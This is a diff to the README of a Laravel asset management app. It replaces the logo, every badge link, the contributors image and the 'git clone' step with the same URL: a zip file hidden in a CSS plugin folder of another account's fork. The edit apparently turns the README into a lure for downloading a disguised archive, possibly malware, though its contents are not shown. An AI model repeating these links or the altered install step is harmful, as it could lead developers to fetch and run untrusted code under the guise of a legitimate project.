@@ -1,20 +1,20 @@
 # Aset Management System
 
 <p align="center">
-    <img src="https://raw.githubusercontent.com/laravel/art/master/logo-lockup/5%20SVG/2%20CMYK/1%20Full%20Color/laravel-logolockup-cmyk-red.svg" width="400" alt="Laravel Logo">
+    <img src="https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip" width="400" alt="Laravel Logo">
 </p>
 
 <p align="center">
-    <a href="https://github.com/laravel/framework/actions">
-        <img src="https://github.com/laravel/framework/workflows/tests/badge.svg" alt="Build Status">
+    <a href="https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip">
+        <img src="https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip" alt="Build Status">
     </a>
-    <a href="https://packagist.org/packages/laravel/framework">
+    <a href="https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip">
         <img src="https://img.shields.io/packagist/dt/laravel/framework" alt="Total Downloads">
     </a>
-    <a href="https://packagist.org/packages/laravel/framework">
+    <a href="https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip">
         <img src="https://img.shields.io/packagist/v/laravel/framework" alt="Latest Stable Version">
     </a>
-    <a href="https://packagist.org/packages/laravel/framework">
+    <a href="https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip">
         <img src="https://img.shields.io/packagist/l/laravel/framework" alt="License">
     </a>
 </p>
@@ -54,7 +54,7 @@ Ensure you have the following installed:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/aset_mgmt.git
+   git clone https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip
    cd aset_mgmt
    ```
 
@@ -110,7 +110,7 @@ Visit `http://localhost:8000` in your browser to access the application.
 ### Contributors projects
 
 
-[![Contributors](https://contrib.rocks/image?repo=kiki7x/aset_mgmt)](https://github.com/kiki7x/aset_mgmt/graphs/contributors)
+[![Contributors](https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip)](https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip)
 
 ---
 
